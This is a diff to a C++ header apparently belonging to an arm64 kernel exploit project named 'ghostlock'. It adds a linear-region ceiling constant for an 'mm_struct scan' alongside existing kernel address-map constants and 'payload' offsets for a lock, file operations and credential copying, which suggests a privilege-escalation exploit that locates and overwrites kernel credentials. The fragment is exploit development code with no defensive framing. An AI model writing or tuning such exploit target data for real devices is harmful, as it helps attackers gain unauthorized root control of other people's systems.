@@ -17,6 +17,12 @@ namespace ghostlock::target {
                 0xffffff8000000000ULL;
         inline constexpr std::uintptr_t kKernelSnitchIdentityEnd =
                 0xffffff8c00000000ULL;
+        /* Stage-2 ceiling for the mm_struct scan: PAGE_END, i.e. the end of the
+         * arm64 linear region, which is -(1 << (VA_BITS - 1)). This is only the
+         * 39-bit value that kPageOffset already assumes; a 48-bit VA target
+         * needs this whole group recomputed, so do not treat it as generic. */
+        inline constexpr std::uintptr_t kKernelSnitchLinearEnd =
+                0xffffffc000000000ULL;
         inline constexpr std::uintptr_t kDirectMapBase = 0xffffff8000000000ULL;
         inline constexpr std::uintptr_t kDirectMapEnd = 0xffffff9000000000ULL;
         inline constexpr std::uintptr_t kVmemmapStart = 0xfffffffe00000000ULL;
@@ -80,6 +86,7 @@ namespace ghostlock::target {
     static_assert(address::kPageOffset == address::kDirectMapBase);
     static_assert(address::kKernelSnitchIdentityStart == address::kDirectMapBase);
     static_assert(address::kKernelSnitchIdentityEnd < address::kDirectMapEnd);
+    static_assert(address::kKernelSnitchIdentityEnd < address::kKernelSnitchLinearEnd);
     static_assert(payload::kLockOffset == 0x0e80);
     static_assert(payload::kFileOperationsOffset == 0x0f80);
     static_assert(payload::kCredentialCopyOffset == 0x1080);
